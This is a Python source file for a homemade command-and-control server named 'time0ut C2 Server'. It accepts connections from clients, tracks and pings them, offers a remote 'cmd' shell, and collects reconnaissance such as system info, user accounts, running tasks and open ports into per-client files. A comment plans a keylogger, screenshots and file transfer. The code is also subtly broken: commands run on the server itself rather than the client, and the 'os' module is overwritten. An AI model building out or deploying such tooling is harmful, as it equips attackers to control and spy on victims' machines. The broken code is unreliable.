import socket
import random
import string
import requests
from string import ascii_lowercase
from datetime import datetime
import time
import subprocess
import os

# create TCP socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# listen on localhost port 1337
s.bind(("127.0.0.1", 1337)) # use 0.0.0.0 to bind all available interface

# queue up to 5 requests
s.listen(5)

# =================================================================
#                      Generating Unique ID
# =================================================================

def generate_unique_id():
    return ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(8))

# =================================================================
#                    Checking Client Status
# =================================================================

def check_client_connection(client_socket):
    try:
        # Set a timeout for receiving data (adjust as needed)
        client_socket.settimeout(1)
        data = client_socket.recv(1024)
        if not data:
            # No data received, assume client is disconnected
            return False
        else:
            # Process received data (e.g., check for heartbeat)
            return True
    except socket.timeout:
        # Timeout occurred, assume client is disconnected
        return False
    except socket.error:
        # Handle socket error (e.g., connection lost)
        return False

def request_heartbeat_from_client(client_socket):
    try:
        # send a heartbeat request to the client
        client_socket.send(b"Request_Heartbeat")

        # wait for the response (heartbeat) from the client
        if check_client_connection(client_socket):
            return True
        else:
            return False

    except socket.error as e:
        return False
    
def handle_connected_clients(client_identifier):
    global connected_sockets

    # request heartbeat from the specified connected client
    client_info = connected_sockets.get(client_identifier)
    if client_info:
        client_socket = client_info.get('socket')

        if client_socket:
            if request_heartbeat_from_client(client_socket):
                return True
            else:
                return False
        else:
            return 'error'
    else:
        print(f"Error: Client {client_identifier} not found in connected_sockets.")

# =================================================================
#                           Timestamp
# =================================================================

def timestamp():
    current_datetime = datetime.now()
    timestamp = current_datetime.strftime("%d/%m/%Y %I:%M:%S %p")
    return (timestamp)

# =================================================================
#                      Remote Command Execution
# =================================================================

current_directory = os.getcwd()

def handle_remote_command(command):
    global current_directory

    if command.lower().startswith('cd '):
        try:
            # more for cmd
            directory = command[3:].strip()  # extract the directory path
            os.chdir(directory)  # change the current working directory
            current_directory = os.getcwd()  # update the global variable
            return f"Changed directory to {current_directory}"
        except Exception as e:
            return f"Error changing directory: {str(e)}"
    else:
        # more for info
        try:
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
            return result
        except subprocess.CalledProcessError as e:
            return f"Error: {e.output}"
        except Exception as e:
            return f"Error handling remote command: {e}"


print("\n\n.------..------..------..------..------..------..------.")
print("|T.--. ||I.--. ||M.--. ||E.--. ||0.--. ||U.--. ||T.--. |")
print("| :/\\: || (\\/) || (\\/) || (\\/) || :/\\: || (\\/) || :/\\: |")
print("| (__) || :\\/: || :\\/: || :\\/: || :\\/: || :\\/: || (__) |")
print("| '--'T|| '--'I|| '--'M|| '--'E|| '--'0|| '--'U|| '--'T|")
print("`------'`------'`------'`------'`------'`------'`------'")
print("time0ut C2 Server\n\n")

print("\033[36m[*] Setting up server...\033[0m")

# =================================================================
#                          Main Menu
# =================================================================

connected_sockets = {}
# {'vikshjoy': {'hostname': 'time0ut', 'publicIP': '42.60.160.43', 'remoteIP': '127.0.0.1', 'remotePort': 3812, 'socket': <socket.socket fd=572, family=2, type=1, proto=0, laddr=('127.0.0.1', 1337), raddr=('127.0.0.1', 3812)>}}
client = ''
while True:

    command = input(f"\n\033[34m[{timestamp()}]\033[0m {client}>> ")

# =================================================================
#             help (display list of possibel commands)
# =================================================================
    if command.lower() == 'help':
        # for every new command, make sure to do a new elif
        print("\033[35m\n\tCommand\t\t\tDescription\033[0m")
        print("\t-------\t\t\t-----------")
        print("\thelp\t\t\tDisplays command list")
        print("\tconnect\t\t\tAttempts to make new connection")
        print("\tdisplay\t\t\tDisplay client information")
        print("\tcurrent\t\t\tDisplay info of current client")
        print("\texit/quit\t\tExit the server")
        print("\tping [identifier]\tCheck to see if client is alive")
        print("\tuse [identifier]\tStart using a specific client")
        print("\tstop [identifer]\tStop using a specific client")
        print("\tremove [identifier]\tRemove client from connection")

        print("\033[33m\n\tCommands you can use once you start using a client:\033[0m")
        # additional idea i can add -> screenshot, live key logger, download upload file
        print("\tinfo\t\t\tDisplay all client information")
        print("\tcmd\t\t\tRemotely execute commands")

# =================================================================
#                connect (server will be listening)
# =================================================================
    elif command.lower() == 'connect':
        while True:
            option = input("\033[36m[*] Listening on port 1337 ([Enter] to establish connection, 'q' to go back)...\n>> \033[0m")

            if option == '':
                print("\033[31m[+] Ready for connection\033[0m")
                # waiting for connection & displaying information
                client_socket, client_address = s.accept()
                unique_id = generate_unique_id()
                connected_sockets[unique_id] = client_socket

                headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/98.0.4758.102"}
                public_ip = requests.get("https://ipapi.co/ip", headers = headers).text

                print("\033[32m[+] Connection Successfully established: \033[0m")
                print("+---------------+---------------+---------------+---------------+---------------+")
                print("| Identifier \t| Hostname \t| Public IP\t| Remote IP \t| Port \t\t|")
                raddr = client_socket.getpeername()[0]
                rport = client_socket.getpeername()[1]
                print("+---------------+---------------+---------------+---------------+---------------+")
                print(f"| {unique_id} \t| {socket.gethostname()} \t| {public_ip} \t| {raddr} \t| {rport} \t|")
                print("+---------------+---------------+---------------+---------------+---------------+")

                # appending to dict
                connected_sockets[unique_id] = {'hostname': socket.gethostname(), 'publicIP': public_ip, 'remoteIP': raddr, 'remotePort': rport, 'socket': client_socket}
                break

            elif option.lower() == 'q':
                print("\033[36m[+] Stopped listener\033[0m")
                break
            else:
                print("\033[31m[-] No such option\033[0m")

# =================================================================
#               display (display machines connected)
# =================================================================
    elif command.lower() == 'display':
        print("+---------------+---------------+---------------+---------------+---------------+---------------+")
        print("| Identifier \t| Hostname \t| Public IP\t| Remote IP \t| Port \t\t| Status \t|")
        for identifier in connected_sockets:
            status = handle_connected_clients(identifier)
            if status == True:
                status = 'alive'
            else: status = 'dead '
            print("+---------------+---------------+---------------+---------------+---------------+---------------+")
            print(f"| {identifier} \t| {connected_sockets[identifier]['hostname']} \t| {connected_sockets[identifier]['publicIP']}\t| {connected_sockets[identifier]['remoteIP']} \t| {connected_sockets[identifier]['remotePort']} \t| {status} \t|")
        print("+---------------+---------------+---------------+---------------+---------------+---------------+")

# =================================================================
#             current (display current client if have)
# =================================================================
    elif command.lower() == 'current':
        if client == '':
            print("\033[33m[-] No client is being use\033[0m")
        else:
            print("+---------------+---------------+---------------+---------------+---------------+---------------+")
            print("| Identifier \t| Hostname \t| Public IP\t| Remote IP \t| Port \t\t| Status \t|")
            status = handle_connected_clients(client.strip())
            if status == True:
                status = 'alive'
            else: status = 'dead '
            print("+---------------+---------------+---------------+---------------+---------------+---------------+")
            print(f"| {client.strip()} \t| {connected_sockets[client.strip()]['hostname']} \t| {connected_sockets[client.strip()]['publicIP']}\t| {connected_sockets[client.strip()]['remoteIP']} \t| {connected_sockets[client.strip()]['remotePort']} \t| {status} \t|")
            print("+---------------+---------------+---------------+---------------+---------------+---------------+")

# =================================================================
#                    exit/quit (exit server)
# =================================================================
    elif command.lower() == 'exit' or command.lower() == 'quit':
        print("\033[31m[-] Exiting time0ut C2 Server\033[0m")
        break
# =================================================================
#            ping [identifier] (check status of client)
# =================================================================  
    elif command.lower().__contains__('ping'):
        uniqueID = command.split(' ')
        status = handle_connected_clients(uniqueID[1])
        if status == True:
            print(f"\033[32m[+] {uniqueID[1]} is alive\033[0m")
        else: print(f"\033[31m[-] {uniqueID[1]} is not responding\033[0m")

# =================================================================
#                   use (start using a client)
# =================================================================
    elif command.lower().__contains__('use'):
        try:
            clientID = command.split(' ')
            if clientID[1] != '' and clientID[1] in connected_sockets:
                client = str(clientID[1]) + " "
                print(f"\033[32m[+] Started using {client}\033[0m")
            else:
                print(f"\033[31m[-] {clientID[1]} does not exist\033[0m")
        except:
            print("\033[31m[x] Require a client identifier\033[0m")

# =================================================================
#                    stop (stop using a client)
# =================================================================
    elif command.lower().__contains__('stop'):
        if client == '':
            print("\033[33m[-] No client is being use\033[0m")
        else:
            print(f"\033[32m[+] Stopped using {client}\033[0m")
            client = ''

# =================================================================
#         remove [identifier] (nuke client connection)
# =================================================================
    elif command.lower().__contains__('remove'):
        try:
            uniqueID = command.split(' ')
            try:
                del connected_sockets[uniqueID[1]]
                print(f"\033[32m[+] Successfully removed {uniqueID[1]}\033[0m")
            except:
                print(f"\033[31m[-] {uniqueID[1]} does not exist\033[0m")
        except:
            print("\033[31m[x] Require a client identifier\033[0m")

# =================================================================
#                info (display info of client)
# =================================================================
    elif command.lower() == 'info':
        if client == '':
            print("\033[33m[-] No client is being use\033[0m")
        else:
            
            status = handle_connected_clients(client.strip())
            if status == True:
                systeminfo = handle_remote_command('systeminfo')
                os = handle_remote_command('ver')
                account = handle_remote_command('net user')
                tasklist = handle_remote_command('tasklist')
                netstat = handle_remote_command('netstat -ano')
                filename = client.strip()
                filepath = f'./info/{filename}'
                print(f"\033[36m[+] Getting info from {client}\033[0m")
                time.sleep(3)
                with open(filepath, 'w') as file:
                    file.write(f'{timestamp()}\nSystem Information\n{systeminfo}\n=========================\nOS Version\n{os}\n=========================\nUser Accounts\n{account}\n=========================\nTask Running\n{tasklist}\n=========================\nPorts open\n{netstat}\n=========================')
                print(f"\033[32m[+] Successfully obtain client info. File is located under /info folder the filename is the client ID.\033[0m")
            else:
                print(f"\033[31m[-] {client} seems to be dead\033[0m")

# =================================================================
#                cmd (open client command prompt)
# =================================================================
    elif command.lower() == 'cmd':
        if client == '':
            print("\033[33m[-] No client is being use\033[0m")
        else:
            print(f"\033[36m[+] You are currently in {client.strip()} command prompt. Enter 'quit' to exit.\033[0m")
            while True:
                pwd = os.getcwd()
                cmd = input(f"time0ut@{client.strip()}~{pwd} $ ")

                if cmd.lower() == 'quit':
                    break
                else:
                    result = handle_remote_command(cmd)
                    print(result)

# =================================================================
#                            error
# =================================================================
    else:
        print("\033[33m[-] Command does not exist, enter help to show list of commands\033[0m")
        socket.close()
